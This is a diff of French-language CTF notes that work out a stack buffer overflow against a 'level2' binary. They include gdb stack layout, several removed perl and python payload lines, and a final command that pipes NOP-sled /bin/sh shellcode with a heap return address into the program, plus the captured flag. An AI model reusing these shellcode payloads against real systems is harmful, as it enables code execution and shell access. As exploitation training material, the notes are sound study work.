@@ -1,63 +1,5 @@
 gdb level2
 
-b *0x080484d4
-disas p
-
-i r
-
-Apres le <+3> :
-
-
-
-ebp => 0xbffff6e8 (adresse haute)
-
-
-0xbffff69c -> 1 (ebp - 0x4c [76 octets])
-
-esp => 0xbffff680 (adresse basse)
-
-Entre esp et ebp : 104 octets
-
-Apres <+19>
-
-esp pointe vers une adresse plus proche de ebp
-
-
-Pile (<+22>):
-
-ebp => 0xbffff6e8 (adresse haute)
-
-
-esp => 0xbffff69c -> 1 (ebp - 0x4c [76 octets])
-
-<+30> on va mettre l'adresse d'eip dans eax (ebp + 4)
-et on va copier cette valeur a ebp-0xc soit (0xbffff6dc)
-
-
-ebp => 0xbffff6e8 (adresse haute)
-
-ebp-12(0xc) => adresse eip (0x80484f5)
-
-esp => 0xbffff69c -> 1 (ebp - 0x4c [76 octets])
-
-ensuite on met valeur eip dans eax
-
-
-
-dans le main a ebp (0xbffff6f8) + 4 on a :
-0xbffff6fc: 0xb7e454d3
-
-
-
-echo `perl -e 'print "B"x49 . "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" . "\xe8\xf6\xff\xbf" ."\x4a\x85\x04\x08" . "B"x92 . "\x9c\xf6\xff\xbf"'` > inject4
-
-
-perl -e 'print "\x90"x49 . "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" . "\xe8\xf6\xff\xbf" ."\x4a\x85\x04\x08" . "\x90"x12 . "\x9c\xf6\xff\xbf"' > inject2
-
-
-perl -e 'print "A"x50 . "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" . "\xd8\xf6\xff\xbf" . "\x4a\x85\x04\x08" . "AAAA" . "BBBB" . "CCCC" . "\xd3\x54\xe4\xb7"' > /tmp/injectx
-
-
 esp < -114 >
 ^
 |
@@ -76,7 +18,8 @@ ebp < +0 >
 |    V
 
 
-dans la fonction <p>
+dans la fonction <p> :
+
 Verification de l'adresse de retour (eip) avec une comparaison (0xb000000). Si l'adresse commence par 0xb => est dans la stack.
 c'est donc une protection pour éviter que l'on exécute du code présent sur la stack.
 
@@ -86,21 +29,21 @@ Il faut donc entrer le shellcode dans la string mais réécrire eip avec cette a
 
 
 Comme on peut le voir ci-dessus, il faut écrire 76 chars pour remplir le buffer (dont le shell code) + 4 chars qui vont écraser ebp + l'adresse sur 4 octets visée sur la heap
+
 Notre shellcode => "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
 Longueur du shellcode : 45
-shellcode + 35 chars + adresse
-ou
-20 x '\90' + shellcode (45) + 15 x 'B' + '\x08\xa0\x04\x08'
+nope + shellcode + adresse
 
 
-(python -c "print ('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x 89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 35 + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
-(python -c "print ('\x90' * 5 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\ x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 30 + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
-(python -c "print ('\x90' * 5 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\ x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 30 + '\x0c\xa0\x04\x08')"; cat) | /home/user/level2/level2
-
-dans gdb : run <<< $(python -c "print ('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 35 + '\x08\xa0\x04\x08')")
+Commande : 
 
 
-flag => 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+(python -c "print ('\x90' * 35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
+
+
+Flag : 
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
 
 
